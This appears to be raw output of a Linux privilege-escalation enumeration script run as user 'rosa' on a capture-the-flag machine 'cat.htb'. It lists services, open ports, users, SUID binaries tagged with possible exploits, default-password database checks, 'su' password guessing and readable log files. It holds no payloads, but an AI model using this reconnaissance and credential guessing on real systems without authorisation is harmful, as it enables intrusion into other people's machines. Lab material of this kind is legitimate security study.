-rwxr-xr-x   1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x   1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x   1 root root 1123 Feb 25  2020 man-db
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x   1 root root 3302 Mar  7  2020 sendmail
-rwxr-xr-x   1 root root  214 Jan 20  2023 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Mar 14  2023 .
drwxr-xr-x 115 root root 4096 Jan 31 11:41 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Mar 14  2023 .
drwxr-xr-x 115 root root 4096 Jan 31 11:41 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Jan 21 12:38 .
drwxr-xr-x 115 root root 4096 Jan 31 11:41 ..
-rwxr-xr-x   1 root root  813 Feb 25  2020 man-db
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root  403 Jan 20  2023 update-notifier-common

[+] Services
[i] Search for outdated versions                                                                                    
 [ - ]  apache-htcacheclean                                                                                         
 [ + ]  apache2
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ + ]  auditd
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ - ]  grub-common
 [ - ]  hwclock.sh
 [ + ]  irqbalance
 [ - ]  iscsid
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ - ]  lvm2
 [ - ]  lvm2-lvmpolld
 [ + ]  networking
 [ - ]  open-iscsi
 [ + ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  screen-cleanup
 [ + ]  sendmail
 [ + ]  ssh
 [ + ]  udev
 [ - ]  uuidd
 [ - ]  x11-common


===================================( Network Information )====================================
[+] Hostname, hosts and DNS                                                                                         
cat                                                                                                                 
127.0.0.1 localhost
127.0.1.1 cat cat.htb

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0 trust-ad

[+] Content of /etc/inetd.conf
/etc/inetd.conf Not Found                                                                                           
                                                                                                                    
[+] Networks and neighbours
# symbolic names for networks, see networks(5) for more information                                                 
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.71.234  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:fe94:acf2  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:fe94:acf2  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:ac:f2  txqueuelen 1000  (Ethernet)
        RX packets 47571  bytes 7394627 (7.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 43633  bytes 6427496 (6.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 60443  bytes 25574195 (25.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 60443  bytes 25574195 (25.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

10.129.0.1 dev eth0 lladdr 00:50:56:b9:f8:ec REACHABLE
fe80::250:56ff:feb9:f8ec dev eth0 lladdr 00:50:56:b9:f8:ec router STALE
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.129.0.1      0.0.0.0         UG    0      0        0 eth0
10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0

[+] Iptables rules
iptables rules Not Found                                                                                            
                                                                                                                    
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                 
Active Internet connections (servers and established)                                                               
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:32809         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33053         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:57825         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:40432         127.0.0.1:32809         ESTABLISHED -                   
tcp        0      0 127.0.0.1:25            127.0.0.1:54678         TIME_WAIT   -                   
tcp        0      0 127.0.0.1:57528         127.0.1.1:80            TIME_WAIT   -                   
tcp        0   2860 10.129.71.234:22        10.10.16.13:51336       ESTABLISHED -                   
tcp        0      0 127.0.0.1:53014         127.0.1.1:80            TIME_WAIT   -                   
tcp        0      0 127.0.0.1:47508         127.0.1.1:80            TIME_WAIT   -                   
tcp        0      0 127.0.0.1:55218         127.0.0.1:57825         ESTABLISHED -                   
tcp        0      0 127.0.0.1:36448         127.0.1.1:80            TIME_WAIT   -                   
tcp        0      0 127.0.0.1:43738         127.0.1.1:80            TIME_WAIT   -                   
tcp        0      0 127.0.0.1:32809         127.0.0.1:40432         ESTABLISHED -                   
tcp        0      0 127.0.0.1:57825         127.0.0.1:55218         ESTABLISHED -                   
tcp        0      1 10.129.71.234:45330     8.8.8.8:53              SYN_SENT    -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 127.0.1.1:80            127.0.0.1:47884         TIME_WAIT   -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:55395         127.0.0.53:53           ESTABLISHED -                   
Recv-Q   Send-Q       Local Address:Port        Peer Address:Port     Process   
0        0                127.0.0.1:55395         127.0.0.53:domain             

[+] Can I sniff with tcpdump?
No                                                                                                                  
                                                                                                                    

====================================( Users Information )=====================================
[+] My user                                                                                                         
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                              
uid=1001(rosa) gid=1001(rosa) groups=1001(rosa),4(adm)                                                              

[+] Do I have PGP keys?
                                                                                                                    
[+] Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                
Sorry, try again.                                                                                                   

[+] Checking /etc/doas.conf
/etc/doas.conf Not Found                                                                                            
                                                                                                                    
[+] Checking Pkexec policy
                                                                                                                    
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

[+] Testing 'su' as other users with shell without password or with their names as password (only works in modern su binary versions)                                                                                                   
Trying with root...                                                                                                 
Trying with axel...
Trying with rosa...
Trying with git...
Trying with jobert...
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                    
[+] Superusers
root:x:0:0:root:/root:/bin/bash                                                                                     

[+] Users with console
axel:x:1000:1000:axel:/home/axel:/bin/bash                                                                          
git:x:114:119:Git Version Control,,,:/home/git:/bin/bash
jobert:x:1002:1002:,,,:/home/jobert:/bin/bash
root:x:0:0:root:/root:/bin/bash
rosa:x:1001:1001:,,,:/home/rosa:/bin/bash

[+] Login information
 09:15:46 up  1:02,  1 user,  load average: 0.36, 0.35, 0.24                                                        
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
axel     pts/0        192.168.1.67     Tue Jun  4 00:07 - crash  (02:49)
reboot   system boot  5.4.0-182-generi Tue Jun  4 00:06 - 04:06 (4+04:00)
axel     pts/0        192.168.1.67     Mon Jun  3 21:56 - crash  (02:09)
axel     tty1                          Mon Jun  3 21:56 - crash  (02:10)
reboot   system boot  5.4.0-182-generi Mon Jun  3 21:54 - 04:06 (4+06:12)
axel     pts/0        192.168.1.67     Mon Jun  3 21:32 - crash  (00:22)
axel     tty1                          Mon Jun  3 21:31 - crash  (00:22)
reboot   system boot  5.4.0-182-generi Mon Jun  3 21:17 - 04:06 (4+06:49)

wtmp begins Mon Jun  3 21:17:13 2024

[+] All users
_apt                                                                                                                
axel
backup
bin
daemon
fwupd-refresh
games
git
gnats
irc
jobert
landscape
_laurel
list
lp
mail
man
messagebus
news
nobody
pollinate
proxy
root
rosa
smmsp
smmta
sshd
sync
syslog
systemd-coredump
systemd-network
systemd-resolve
systemd-timesync
sys
tcpdump
tss
usbmux
uucp
uuidd
www-data


===================================( Software Information )===================================
[+] MySQL version                                                                                                   
mysql Not Found                                                                                                     
                                                                                                                    
[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No                                                         
[+] MySQL connection using root/NOPASS ................. No                                                         
[+] Looking for mysql credentials                                                                                   
 Not Found                                                                                                          
                                                                                                                    
[+] PostgreSQL version and pgadmin credentials
 Not Found                                                                                                          
                                                                                                                    
[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                            
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                            
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                            
                                                                                                                    
[+] Apache server info
Version: Server version: Apache/2.4.41 (Ubuntu)                                                                     
Server built:   2024-07-17T18:58:09

[+] Looking for PHPCookies
 Not Found                                                                                                          
                                                                                                                    
[+] Looking for Wordpress wp-config.php files
wp-config.php Not Found                                                                                             
                                                                                                                    
[+] Looking for Tomcat users file
tomcat-users.xml Not Found                                                                                          
                                                                                                                    
[+] Mongo information
 Not Found                                                                                                          
                                                                                                                    
[+] Looking for supervisord configuration file
supervisord.conf Not Found                                                                                          
                                                                                                                    
[+] Looking for cesi configuration file
cesi.conf Not Found                                                                                                 
                                                                                                                    
[+] Looking for Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf                                                                           
        path = /var/www/pub

[+] Looking for Hostapd config file
hostapd.conf Not Found                                                                                              
                                                                                                                    
[+] Looking for wifi conns file
 Not Found                                                                                                          
                                                                                                                    
[+] Looking for Anaconda-ks config files
anaconda-ks.cfg Not Found                                                                                           
                                                                                                                    
[+] Looking for .vnc directories and their passwd files
.vnc Not Found                                                                                                      
                                                                                                                    
[+] Looking for ldap directories and their hashes
/etc/ldap /usr/share/sendmail/examples/ldap                                                                         
The password hash is from the {SSHA} to 'structural'

[+] Looking for .ovpn files and credentials
.ovpn Not Found                                                                                                     
                                                                                                                    
[+] Looking for ssl/ssh files
/home/rosa/.ssh/authorized_keys                                                                                     
PubkeyAuthentication yes
PasswordAuthentication Yes
ChallengeResponseAuthentication no
UsePAM yes
  -- Some certificates were found:
/usr/lib/crda/pubkeys/benh@debian.org.key.pub.pem
/usr/lib/crda/pubkeys/linville.key.pub.pem
/usr/lib/crda/pubkeys/sforshee.key.pub.pem
/usr/lib/python3/dist-packages/twisted/internet/test/fake_CAs/chain.pem
/etc/pollinate/entropy.ubuntu.com.pem
/etc/mail/tls/sendmail-server.crt
/etc/mail/tls/sendmail-client.crt
/etc/pki/fwupd/LVFS-CA.pem
/etc/pki/fwupd-metadata/LVFS-CA.pem
/var/lib/fwupd/pki/client.pem
/etc/mail/tls/sendmail-server.csr /etc/mail/tls/sendmail-client.csr

[+] Looking for unexpected auth lines in /etc/pam.d/sshd
No                                                                                                                  
                                                                                                                    
[+] Looking for AWS Keys
                                                                                                                    
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe              
/etc/exports Not Found                                                                                              
                                                                                                                    
[+] Looking for kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                               
krb5.conf Not Found                                                                                                 
tickets kerberos Not Found                                                                                          
                                                                                                                    
[+] Looking for Kibana yaml
kibana.yml Not Found                                                                                                
                                                                                                                    
[+] Looking for logstash files
 Not Found                                                                                                          
                                                                                                                    
[+] Looking for elasticsearch files
 Not Found                                                                                                          
                                                                                                                    
[+] Looking for Vault-ssh files
vault-ssh-helper.hcl Not Found                                                                                      
                                                                                                                    
[+] Looking for AD cached hahses
cached hashes Not Found                                                                                             
                                                                                                                    
====================================( Interesting Files )=====================================
[+] SUID                                                                                                            
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                
/usr/lib/eject/dmcrypt-get-device                                                                                   
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/sbin/sensible-mda
/usr/bin/fusermount
/usr/bin/newgrp         --->    HP-UX_10.20
/usr/bin/chfn           --->    SuSE_9.3/10
/usr/bin/su
/usr/bin/procmail
/usr/bin/umount         --->    BSD/Linux[1996-08-13]
/usr/bin/chsh
/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/usr/bin/at
/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM
/usr/bin/pkexec         --->    rhel_6/Also_check_groups_privileges_and_pkexec_policy
/usr/bin/sudo           --->    /sudo$
/usr/bin/gpasswd

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                
/usr/lib/sm.bin/sendmail                --->    Sendmail_8.10.1/Sendmail_8.11.x/Linux_Kernel_2.2.x_2.4.0-test1_(SGI_ProPack_1.2/1.3)                                                                                                    
/usr/lib/sm.bin/mailstats
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/sbin/unix_chkpwd
/usr/sbin/pam_extrausers_chkpwd
/usr/bin/lockfile
/usr/bin/dotlockfile
/usr/bin/expiry
/usr/bin/procmail
/usr/bin/ssh-agent
/usr/bin/chage
/usr/bin/mail-touchlock
/usr/bin/at
/usr/bin/bsd-write
/usr/bin/mail-lock
/usr/bin/mail-unlock
/usr/bin/crontab

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                        
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep         
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep

[+] .sh files in path
/usr/bin/rescan-scsi-bus.sh                                                                                         
/usr/bin/gettext.sh

[+] Hashes inside passwd file? ........... No
[+] Can I read shadow files? ........... No                                                                         
[+] Can I read root folder? ........... No                                                                          
                                                                                                                    
[+] Looking for root files in home dirs (limit 20)
/home                                                                                                               
/home/rosa/.sqlite_history
/home/rosa/.bash_history
/home/rosa/.python_history

[+] Looking for root files in folders owned by me
lrwxrwxrwx 1 root root 9 Jan 21 12:49 /home/rosa/.sqlite_history -> /dev/null                                       
lrwxrwxrwx 1 root root 9 Jan 21 12:49 /home/rosa/.bash_history -> /dev/null
lrwxrwxrwx 1 root root 9 Aug 31 23:31 /home/rosa/.python_history -> /dev/null
-rw-r--r-- 1 root root 0 Feb  3 09:15 /sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/notify_on_release                                                                                                             
-r--r--r-- 1 root root 0 Feb  3 09:04 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/cgroup.events                                                                                                                 
-rw-r--r-- 1 root root 0 Feb  3 09:15 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/io.pressure                                                                                                                   
-rw-r--r-- 1 root root 0 Feb  3 09:15 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/cgroup.max.descendants                                                                                                        
-r--r--r-- 1 root root 0 Feb  3 09:15 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/cpu.stat
-rw-r--r-- 1 root root 0 Feb  3 09:15 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/memory.pressure                                                                                                               
-rw-r--r-- 1 root root 0 Feb  3 09:15 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/cpu.pressure                                                                                                                  
-rw-r--r-- 1 root root 0 Feb  3 09:15 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/cgroup.type                                                                                                                   
-r--r--r-- 1 root root 0 Feb  3 09:15 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/cgroup.stat                                                                                                                   
-rw-r--r-- 1 root root 0 Feb  3 09:15 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/cgroup.freeze                                                                                                                 
-r--r--r-- 1 root root 0 Feb  3 09:15 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/cgroup.controllers                                                                                                            
-rw-r--r-- 1 root root 0 Feb  3 09:15 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/cgroup.max.depth                                                                                                              

[+] Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root adm 3040471 Feb  3 09:16 /var/log/audit/audit.log                                                 
-r--r----- 1 root adm 8388621 Jan 27 15:58 /var/log/audit/audit.log.4
-r--r----- 1 root adm 8388660 Feb  3 09:03 /var/log/audit/audit.log.1
-r--r----- 1 root adm 8388837 Jan 27 15:59 /var/log/audit/audit.log.3
-r--r----- 1 root adm 8388632 Jan 31 11:17 /var/log/audit/audit.log.2
-rw-r----- 1 root adm 704 Dec 31 12:31 /var/log/apt/term.log.2.gz
-rw-r----- 1 root adm 4114 Jul 30  2024 /var/log/apt/term.log.5.gz
-rw-r----- 1 root adm 3766 Aug 31 18:31 /var/log/apt/term.log.4.gz
-rw-r----- 1 root adm 12652 Jun 12  2024 /var/log/apt/term.log.6.gz
-rw-r----- 1 root adm 2453 Sep  4 01:53 /var/log/apt/term.log.3.gz
-rw-r----- 1 root adm 0 Feb  3 08:13 /var/log/apt/term.log
-rw-r----- 1 root adm 6150 Jan 27 15:59 /var/log/apt/term.log.1.gz
-rw-r----- 1 root adm 1543421 Feb  3 09:15 /var/log/apache2/access.log
-rw-r----- 1 root adm 724 Jan 30 15:40 /var/log/apache2/access.log.2.gz
-rw-r----- 1 root adm 689 Jan 31 12:30 /var/log/apache2/error.log.1
-rw-r----- 1 root adm 1553985 Feb  3 08:29 /var/log/apache2/error.log
-rw-r----- 1 root adm 351 Jan 30 15:40 /var/log/apache2/error.log.2.gz
-rw-r----- 1 root adm 0 Jan 21 12:34 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root adm 198937 Jan 31 12:30 /var/log/apache2/access.log.1
-rw-r-----+ 1 root systemd-journal 524288 Feb  3 09:16 /var/log/journal/57e7eb2a83ed4e11a0f3602ef7e94d62/system@dcc29032ad0947d48c874c8e78a22d3b-000000000005072c-00062d39575a1038.journal                                              
-rw-r-----+ 1 root systemd-journal 524288 Feb  3 09:16 /var/log/journal/57e7eb2a83ed4e11a0f3602ef7e94d62/system@dcc29032ad0947d48c874c8e78a22d3b-0000000000050921-00062d3957766259.journal                                              
-rw-r-----+ 1 root systemd-journal 524288 Feb  3 09:16 /var/log/journal/57e7eb2a83ed4e11a0f3602ef7e94d62/user-1001.journal                                                                                                              
-rw-r-----+ 1 root systemd-journal 524288 Feb  3 09:16 /var/log/journal/57e7eb2a83ed4e11a0f3602ef7e94d62/system.journal                                                                                                                 
-rw-r----- 1 root adm 10431 Jun  3  2024 /var/log/installer/subiquity-server-info.log.2098
-rw-r----- 1 root adm 93146 Jun  3  2024 /var/log/installer/subiquity-server-debug.log.2098
-rw-r----- 1 root adm 492234 Jun  3  2024 /var/log/installer/installer-journal.txt
-rw-r----- 1 root adm 2991 Jun  3  2024 /var/log/installer/subiquity-curtin-install.conf
-rw-r----- 1 root adm 2839 Jun  3  2024 /var/log/installer/subiquity-client-info.log.2048
-rw-r----- 1 root adm 2261 Jun  3  2024 /var/log/installer/autoinstall-user-data
-rw-r----- 1 root adm 285 Jun  3  2024 /var/log/installer/subiquity-curtin-apt.conf
-rw-r----- 1 root adm 14825 Jun  3  2024 /var/log/installer/subiquity-client-debug.log.2048
-rw-r----- 1 root adm 282216 Dec 31 12:27 /var/log/cloud-init-output.log

[+] Files inside /home/rosa (limit 20)
total 36                                                                                                            
drwxr-x--- 6 rosa rosa 4096 Feb  3 09:15 .
drwxr-xr-x 6 root root 4096 Aug 30 23:19 ..
lrwxrwxrwx 1 root root    9 Jan 21 12:49 .bash_history -> /dev/null
-rw-r--r-- 1 rosa rosa  220 Aug  7 04:56 .bash_logout
-rw-r--r-- 1 rosa rosa 3598 Sep  1 00:43 .bashrc
drwx------ 2 rosa rosa 4096 Sep 13 00:59 .cache
drwx------ 2 rosa rosa 4096 Feb  3 09:15 .gnupg
drwxrwxr-x 3 rosa rosa 4096 Sep 28 05:12 .local
-rw-r--r-- 1 rosa rosa  807 Aug  7 04:56 .profile
lrwxrwxrwx 1 root root    9 Aug 31 23:31 .python_history -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 21 12:49 .sqlite_history -> /dev/null
drwx------ 2 rosa rosa 4096 Jan 14 17:08 .ssh

[+] Files inside others home (limit 20)
                                                                                                                    
[+] Mails (limited 50)
/var/mail/axel                                                                                                      
/var/mail/jobert
/var/mail/root
/var/spool/mail/axel
/var/spool/mail/jobert
/var/spool/mail/root

[+] Backup files?
-rw-r--r-- 1 root smmsp 64161 Aug 30 04:09 /var/backups/sendmail.cf.bak                                             
-rw-r--r-- 1 root smmsp 2375 Aug 30 04:09 /var/backups/submit.mc.bak
-rw-r--r-- 1 root smmsp 44601 Aug 30 04:09 /var/backups/submit.cf.bak
-rw-r--r-- 1 root smmsp 4058 Aug 30 04:09 /var/backups/sendmail.mc.bak

[+] Looking for readable .db files
/var/lib/fwupd/pending.db                                                                                           
/var/lib/command-not-found/commands.db
/var/lib/PackageKit/transactions.db
/var/cache/man/de/index.db
/var/cache/man/pt/index.db
/var/cache/man/es/index.db
/var/cache/man/ja/index.db
/var/cache/man/zh_TW/index.db
/var/cache/man/sv/index.db
/var/cache/man/fr/index.db
/var/cache/man/nl/index.db
/var/cache/man/pt_BR/index.db
/var/cache/man/index.db
/var/cache/man/pl/index.db
/var/cache/man/hu/index.db
/var/cache/man/da/index.db
/var/cache/man/sl/index.db
/var/cache/man/ko/index.db
/var/cache/man/sr/index.db
/var/cache/man/ru/index.db
/var/cache/man/tr/index.db
/var/cache/man/zh_CN/index.db
/var/cache/man/it/index.db
/var/cache/man/cs/index.db
/var/cache/man/id/index.db
/var/cache/man/fi/index.db
/usr/lib/x86_64-linux-gnu/avahi/service-types.db
/usr/lib/firmware/regulatory.db

[+] Web files?(output limited)
/var/www/:                                                                                                          
total 16K
drwxr-xr-x  4 root     root     4.0K Jul 23  2024 .
drwxr-xr-x 13 root     root     4.0K Jun  6  2024 ..
drwxrwx---  8 www-data www-data 4.0K Sep 28 01:03 cat.htb
drwxr-xr-x  2 root     root     4.0K Jul 17  2024 html

/var/www/html:
total 8.0K
drwxr-xr-x 2 root root 4.0K Jul 17  2024 .

[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                                         
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                 
-rw-r--r-- 1 root root 2978 Feb 17  2020 /usr/share/byobu/profiles/bashrc                                           
-rw-r--r-- 1 root root 2778 Sep 15  2018 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Sep 15  2018 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
-rw-r--r-- 1 root root 3106 Jan  2  2024 /usr/share/base-files/dot.bashrc
-rw-r--r-- 1 root root 2319 Feb 25  2020 /etc/bash.bashrc
-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
-rw-r--r-- 1 rosa rosa 3598 Sep  1 00:43 /home/rosa/.bashrc
-rw-r--r-- 1 rosa rosa 807 Aug  7 04:56 /home/rosa/.profile

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 100)
     2117      4 -rw-r--r--   1 root     root         2613 Oct 30 13:54 /usr/lib/jvm/.java-1.8.0-openjdk-amd64.jinfo
    86848    236 -rw-r--r--   1 root     root       237641 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/.config
    97312     16 -rw-r--r--   1 root     root        14494 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/kernel/.bounds.s.cmd
    86889     64 -rw-r--r--   1 root     root        64784 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/arch/x86/kernel/.asm-offsets.s.cmd
    86893      8 -rw-r--r--   1 root     root         4841 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/arch/x86/tools/.relocs_64.o.cmd
    86892      8 -rw-r--r--   1 root     root         4841 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/arch/x86/tools/.relocs_32.o.cmd
    86891      4 -rw-r--r--   1 root     root          148 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/arch/x86/tools/.relocs.cmd
    86894      8 -rw-r--r--   1 root     root         4821 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/arch/x86/tools/.relocs_common.o.cmd
    86856      4 -rw-r--r--   1 root     root          267 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/arch/x86/include/generated/asm/.unistd_64_x32.h.cmd
    86853      4 -rw-r--r--   1 root     root          243 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/arch/x86/include/generated/asm/.syscalls_32.h.cmd
    86857      4 -rw-r--r--   1 root     root          353 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/arch/x86/include/generated/asm/.xen-hypercalls.h.cmd
    86855      4 -rw-r--r--   1 root     root          271 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/arch/x86/include/generated/asm/.unistd_32_ia32.h.cmd
    86854      4 -rw-r--r--   1 root     root          243 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/arch/x86/include/generated/asm/.syscalls_64.h.cmd
    86869      4 -rw-r--r--   1 root     root          266 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/arch/x86/include/generated/uapi/asm/.unistd_32.h.cmd
    86871      4 -rw-r--r--   1 root     root          291 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd
    86870      4 -rw-r--r--   1 root     root          271 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/arch/x86/include/generated/uapi/asm/.unistd_64.h.cmd
    86851      4 -rw-r--r--   1 root     root          999 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/.missing-syscalls.d
    86849    236 -rw-r--r--   1 root     root       237789 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/.config.old
    97393     12 -rw-r--r--   1 root     root         9091 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.elf.o.cmd
    97394      8 -rw-r--r--   1 root     root         6836 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.exec-cmd.o.cmd
    97412      4 -rw-r--r--   1 root     root         1952 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.subcmd-config.o.cmd
    97391      8 -rw-r--r--   1 root     root         8043 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.builtin-orc.o.cmd
    97410     12 -rw-r--r--   1 root     root         8586 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.special.o.cmd
    97408     12 -rw-r--r--   1 root     root         8442 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.run-command.o.cmd
    97403      8 -rw-r--r--   1 root     root         6450 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.objtool.o.cmd
    97400      8 -rw-r--r--   1 root     root         5925 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.libstring.o.cmd
    97392     12 -rw-r--r--   1 root     root         8682 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.check.o.cmd
    97409      8 -rw-r--r--   1 root     root         6042 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.sigchain.o.cmd
    97404     12 -rw-r--r--   1 root     root         8973 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.orc_dump.o.cmd
    97407      8 -rw-r--r--   1 root     root         6311 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.parse-options.o.cmd
    97406      8 -rw-r--r--   1 root     root         6997 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.pager.o.cmd
    97413     12 -rw-r--r--   1 root     root         9460 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/arch/x86/.decode.o.cmd
